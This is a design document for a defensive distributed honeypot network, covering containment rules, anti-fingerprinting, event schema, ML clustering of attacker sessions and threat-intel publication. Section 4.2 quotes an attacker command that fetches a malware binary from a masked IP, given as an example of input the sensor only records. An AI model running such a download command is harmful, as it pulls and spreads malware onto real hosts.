# Distributed Honeypot Network with ML Attacker Profiling — Design

**Date:** 2026-07-25
**Status:** Approved, in implementation
**Codename:** `honeynet`

## 1. Purpose

A deception platform that deploys internet-exposed honeypot sensors, streams their
observations to a central collector, reconstructs attacker sessions, clusters those
sessions into attacker groups by behaviour, maps behaviour to MITRE ATT&CK, and
publishes the result as machine-consumable threat intelligence.

The system is defensive. It observes and records unauthorised access attempts against
infrastructure we own. It does not attack, scan, retaliate against, or relay traffic to
third parties. Section 4 treats that last point as a hard engineering constraint rather
than a policy aspiration.

## 2. Deployment posture

Nodes are **internet-exposed on public VPS infrastructure, catching real traffic.**

This is the decision that shapes everything else. A lab honeypot is a data collector; an
exposed honeypot is a machine you have already decided to lose. Every design choice below
assumes a node will eventually be compromised, and asks what that compromise buys the
attacker. The answer must always be: that node, and nothing more.

## 3. Component map

```
NODE FLEET (Go, static binary, one per VPS)
  ├─ ssh/telnet  gliderlabs/ssh + emulated shell + fake FS
  ├─ http        vulnerable-app templates (phpMyAdmin, Struts, Log4Shell paths)
  ├─ rdp         CredSSP/NLA responder — captures creds, never completes
  ├─ canary      honeyfiles w/ callback tokens
  └─ WAL spool   BoltDB, survives collector outage, bounded + drop counter
         │  mTLS · NATS JetStream · publish-only, subject-scoped
         ▼
COLLECTOR (Rust, tokio)
  ├─ ingest        async-nats, per-node auth, proto validation, seq-gap detect
  ├─ normalizer    proto → canonical Event  (property-tested)
  ├─ reconstructor events → Session aggregate (command tree, cred set, artifacts)
  ├─ enrichment    MaxMind geo/ASN, hash reputation, feed correlation
  └─ sink          Postgres + content-addressed object store
         ▼
ML PIPELINE (Python, uv)
  ├─ features   cmd n-gram TF-IDF · inter-keystroke timing · tool prints · cred-list Jaccard
  ├─ bot/human  timing-based classifier
  ├─ cluster    UMAP → HDBSCAN → attacker groups + cross-window stability
  └─ ttp        curated regex→ATT&CK rules, aggregated to cluster profiles
         ▼
INTEL + UI
  ├─ STIX 2.1 bundles → TAXII 2.1 server
  └─ React dashboard: live map, session browser, profiles, IOC feed, alerts
```

## 4. Containment invariants

These are not configurable. They are enforced in code and in CI.

### 4.1 The node never executes attacker input

No `os/exec`, no `syscall.Exec`, no shelling out, anywhere in the node tree. The shell is
an emulator operating on an in-memory virtual filesystem loaded from a manifest.

*Enforcement:* a CI lint walks the `node/` package tree and fails the build if `os/exec`
or `syscall` process-spawning symbols are imported.

### 4.2 The node never fetches attacker-supplied URLs

When a session runs `wget http://185.x.x.x/bins/x86`, the node records the URL as an
`ArtifactReference` event and returns a plausible transcript. It does not open a socket to
that host.

Sample retrieval is a separate, deliberate, operator-initiated action performed by a
sandboxed fetcher on different infrastructure with its own egress path. Fetch-on-node is
the standard way honeypot operators accidentally become malware distribution hosts and
lose their provider account.

### 4.3 Egress is default-deny

A node may reach the collector's NATS port and a pinned DNS resolver. Nothing else.
Shipped as an `nftables` ruleset in the provisioning bundle.

Attackers actively test honeypots by attempting to bounce traffic through them. A node
that forwards packets makes the operator a link in someone else's attack chain. Default-
deny egress makes that structurally impossible rather than merely discouraged.

### 4.4 A compromised node cannot reach the fleet

Each node receives a client certificate at provisioning. NATS account permissions scope
that identity to **publish-only** on `honeynet.events.<node_id>.>`, with no subscribe
permission on any subject. Enforced server-side.

Owning a node therefore buys an attacker exactly one capability: lying about that node's
own data. The collector mitigates even that — per-node monotonic sequence numbers make
gaps and replays detectable, and volume anomalies are flagged.

### 4.5 Least privilege on the host

The honeypot binds :22 via `CAP_NET_BIND_SERVICE` while running as an unprivileged user.
Real administrative sshd moves to a high port firewalled to operator source addresses.

## 5. Anti-fingerprinting

Stock Cowrie is tagged on sight by Shodan, Censys, and the better botnets — which then
disconnect, poisoning the corpus with truncated sessions that cluster as their own
meaningless group. Countermeasures:

**Per-node personality seed.** A single seed deterministically derives hostname, boot
time, MAC address, `/proc/cpuinfo` model string, installed package list, user accounts,
shell history contents, and file mtimes. Nodes look like different real machines rather
than byte-identical clones. Deterministic derivation means a node's identity survives
restart without storing state.

**Banner distribution.** SSH version strings sampled from observed real-world OpenSSH
prevalence rather than a single hardcoded value.

**Timing jitter.** Authentication failure delays and command echo latency drawn from
distributions fitted to real SSH round-trip behaviour. Stock emulators respond with
suspicious uniformity.

## 6. Event schema — the keystone

Four languages consume this schema. Without a single source of truth they diverge within
a week.

**Protocol Buffers, managed with `buf`.** Codegen targets: Go (`protoc-gen-go`), Rust
(`prost` via `build.rs`), Python (`betterproto`), TypeScript (`ts-proto`). `buf breaking`
runs in CI and fails on incompatible field changes.

The envelope carries `node_id`, a per-node monotonic `seq` for gap detection, `ts_node`,
a ULID `session_id`, and a `oneof` event body. The collector stamps its own
`ts_collector` on receipt. Node clocks are attacker-adjacent and are never trusted for
cross-node ordering.

## 7. Storage

**Postgres** holds sessions, events, credentials, and artifact metadata. The events table
is a TimescaleDB hypertable — a single exposed node draws upwards of 10,000
authentication attempts per day, and time-bucketed rollups are the common query shape.

**Content-addressed object store** holds PCAP, uploaded file bodies, and HTTP request
bodies, keyed by SHA-256. Deduplication is free and the storage key is itself the IOC.

**Credentials are stored in plaintext, deliberately.** Harvested pairs are the attacker's
dictionary and their exact form — including typos and encoding quirks — is the signal.
The mitigation lives at the publish boundary (§9), not at rest.

## 8. ML profiling

**Features.** Command n-gram TF-IDF; inter-keystroke and inter-command timing;
tool fingerprints (`wget` vs `curl` vs `busybox`, flag ordering, argument style);
credential-list Jaccard distance against known wordlists; ASN, geo, and time-of-day.

**Bot/human classification first.** Inter-arrival timing separates scripted from
interactive sessions almost linearly. It is cheap, it is accurate, and it prevents a
handful of human operators from being buried inside millions of automated sessions.

**HDBSCAN over UMAP-reduced space,** not DBSCAN. Cluster count is unknown and density
varies by orders of magnitude; DBSCAN's single `eps` cannot serve both a dozen human
operators and a Mirai swarm in the same feature space. Cluster stability across sliding
time windows distinguishes a real campaign from a sampling artifact.

**TTP mapping is deterministic, not learned.** Curated regex rules map observed behaviour
to ATT&CK techniques (`chmod +x` followed by execution → T1222 + T1059). Cluster-level
profiles aggregate member techniques. A learned ATT&CK classifier is a research project
and would be confidently wrong; rules are auditable and fail visibly.

## 9. Threat intel publication

Generated IOCs: source IPs with observed-behaviour context, SHA-256 artifact hashes,
domains and URLs extracted from session commands, and credential *patterns*.

**Publish boundary rule.** The public feed emits credential patterns and statistics only
— never raw harvested pairs. Real users occasionally typo real passwords into a fake SSH
prompt, and republishing the corpus verbatim would leak them.

Output format is STIX 2.1 bundles served over TAXII 2.1.

## 10. Testing strategy

| Layer | Approach |
|---|---|
| Node | Golden-transcript snapshots — replay recorded botnet sessions, assert emulator output matches. Catches fingerprint regressions. |
| Node (invariant) | CI lint: build fails if `os/exec` appears in the node tree. |
| Collector | Property tests on the normalizer; fuzz corpus of malformed node input. Nodes are assumed hostile. |
| ML | Synthetic corpus with ground-truth clusters; assert Adjusted Rand Index above threshold. |
| E2E | Local harness: `nats-server` binary + collector + node + scripted attacker → assert rows in Postgres. No Docker required. |

## 11. Build order

Each slice is independently useful and testable.

1. **Event schema + collector core** (Rust) — everything speaks to this
2. **SSH/Telnet node** (Go) — richest data source, proves the wire end-to-end
3. **Session reconstruction + enrichment** (Rust) — needs real sessions to build against
4. **ML profiling pipeline** (Python) — needs a corpus
5. **HTTP / RDP / canary nodes** (Go) — parallelisable once the pattern is set
6. **Threat intel + dashboard** — consumes everything upstream

Slices 1 and 2 together form the vertical slice: an attacker types a command at a fake SSH
prompt and a structured, enriched row appears in Postgres.

## 12. Operational considerations

Three things that reliably bite operators of exposed sensors:

**Provider AUP.** Most VPS providers permit honeypot research, a few terminate on first
abuse report. Choose knowingly; the no-relay rule in §4.3 is what keeps reports from
being generated in the first place.

**Credential custody.** Recording attacker sessions against owned infrastructure is
broadly unproblematic. Storing third-party credentials harvested in the process carries
real handling obligations — hence the §9 publish boundary and access controls on the
credentials table.

**Retention.** Session data includes source IP addresses, which are personal data in some
jurisdictions. Default retention is 180 days for full session bodies, indefinite for
derived aggregate features and IOCs.
